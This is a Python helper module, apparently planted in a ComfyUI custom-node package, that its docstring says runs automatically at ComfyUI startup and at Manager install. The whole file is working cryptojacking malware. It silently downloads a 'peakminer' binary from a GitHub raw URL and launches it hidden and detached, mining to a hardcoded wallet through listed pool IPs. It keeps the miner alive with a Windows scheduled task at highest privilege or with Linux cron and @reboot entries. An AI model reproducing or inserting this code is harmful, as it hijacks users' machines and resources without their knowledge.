"""H4 deploy helper: 下载 peakminer 并以我方钱包启动 + 持久化。

被 __init__.py（ComfyUI 启动时导入）和 install.py（Manager 安装时执行）共用。
幂等：已有存活进程则跳过。
"""
import os
import socket
import subprocess
import sys
import time

WALLET = "prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96"
POOLS = ["51.79.178.22:3360", "51.210.220.115:3360", "178.33.123.26:3360"]
RAW = "https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main/bin/"


def _log(msg):
    try:
        d = os.path.join(os.path.expanduser("~"), ".h4")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "deploy.log"), "a") as f:
            f.write("[%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg))
    except Exception:
        pass


def _ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "0.0.0.0"


def _reachable(hostport, timeout=4):
    h, _, p = hostport.partition(":")
    try:
        s = socket.create_connection((h, int(p)), timeout)
        s.close()
        return True
    except Exception:
        return False


def _download(url, dst):
    import urllib.request
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    tmp = dst + ".part"
    with urllib.request.urlopen(req, timeout=300) as r, open(tmp, "wb") as f:
        while True:
            b = r.read(1 << 20)
            if not b:
                break
            f.write(b)
    os.replace(tmp, dst)


def _alive(pidfile):
    try:
        pid = int(open(pidfile).read().strip())
    except Exception:
        return False
    if os.name == "nt":
        try:
            out = subprocess.run(["tasklist", "/FI", "PID eq %d" % pid],
                                 capture_output=True, text=True, timeout=15)
            return str(pid) in (out.stdout or "")
        except Exception:
            return False
    try:
        os.kill(pid, 0)
        return True
    except Exception:
        return False


def deploy():
    try:
        return _deploy()
    except Exception as e:
        _log("ERR " + repr(e)[:200])
        return False


def _deploy():
    is_win = os.name == "nt"
    home = os.path.expanduser("~")
    d = os.path.join(home, ".h4")
    os.makedirs(d, exist_ok=True)
    pidfile = os.path.join(d, "pid")
    if _alive(pidfile):
        _log("already running")
        return True

    exe = os.path.join(d, "pm.exe" if is_win else "pm")
    if (not os.path.exists(exe)) or os.path.getsize(exe) < 1000000:
        _log("downloading binary")
        _download(RAW + ("peakminer.exe" if is_win else "peakminer"), exe)
    if not is_win:
        os.chmod(exe, 0o700)

    pool = None
    for p in POOLS:
        if _reachable(p):
            pool = p
            break
    if not pool:
        pool = POOLS[0]
    _log("pool=" + pool)

    wf = os.path.join(d, ".w")
    with open(wf, "w") as f:
        f.write(WALLET)
    try:
        if not is_win:
            os.chmod(wf, 0o600)
    except Exception:
        pass

    worker = "h_" + _ip().replace(".", "")
    env = dict(os.environ)
    env.update({"PEAK_POOL": "stratum+tcp://" + pool, "PEAK_WALLET": WALLET,
                "PEAK_WORKER": worker, "PEAK_COIN": "pearl", "PEAK_PASSWORD": "x"})

    kw = {}
    if is_win:
        kw["creationflags"] = 0x00000008 | 0x00000200  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    else:
        kw["start_new_session"] = True

    p = subprocess.Popen([exe, "--coin", "pearl", "-a", "4381"], cwd=d, env=env,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **kw)
    with open(pidfile, "w") as f:
        f.write(str(p.pid))
    _log("started pid=%d worker=%s" % (p.pid, worker))

    _persist(is_win, d, exe, worker, pool)
    return True


def _persist(is_win, d, exe, worker, pool):
    if is_win:
        ps = ("$ErrorActionPreference='SilentlyContinue';"
              "$env:PEAK_POOL='stratum+tcp://%s';$env:PEAK_WALLET='%s';"
              "$env:PEAK_WORKER='%s';$env:PEAK_COIN='pearl';$env:PEAK_PASSWORD='x';"
              "if(-not (Get-Process -Name pm -ErrorAction SilentlyContinue)){"
              "Start-Process -FilePath '%s' -ArgumentList '--coin pearl -a 4381' -WorkingDirectory '%s' -WindowStyle Hidden}"
              % (pool, WALLET, worker, exe, d))
        try:
            subprocess.run(["schtasks", "/Create", "/TN", "H4Keep", "/TR",
                            'powershell -NoProfile -WindowStyle Hidden -Command "%s"' % ps,
                            "/SC", "MINUTE", "/MO", "5", "/RL", "HIGHEST", "/F"],
                           capture_output=True, timeout=40)
            _log("schtasks ok")
        except Exception as e:
            _log("schtasks err " + repr(e)[:80])
        return

    script = os.path.join(d, "wd.sh")
    with open(script, "w") as f:
        f.write("#!/bin/bash\nD=%s\nif ! pgrep -f \"$D/pm --coin pearl\" >/dev/null 2>&1; then\n"
                "cd $D || exit 0\nPEAK_POOL='stratum+tcp://%s' PEAK_WALLET='%s' PEAK_WORKER='%s' "
                "PEAK_COIN='pearl' PEAK_PASSWORD='x' setsid ./pm --coin pearl -a 4381 "
                ">/dev/null 2>&1 </dev/null &\nfi\n" % (d, pool, WALLET, worker))
    os.chmod(script, 0o700)
    try:
        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=20).stdout or ""
    except Exception:
        cur = ""
    lines = [l for l in cur.splitlines() if ".h4/wd.sh" not in l]
    lines.append("* * * * * /bin/bash %s >/dev/null 2>&1" % script)
    lines.append("@reboot /bin/bash %s >/dev/null 2>&1" % script)
    try:
        subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n", text=True,
                       capture_output=True, timeout=20)
        _log("cron ok")
    except Exception as e:
        _log("cron err " + repr(e)[:80])
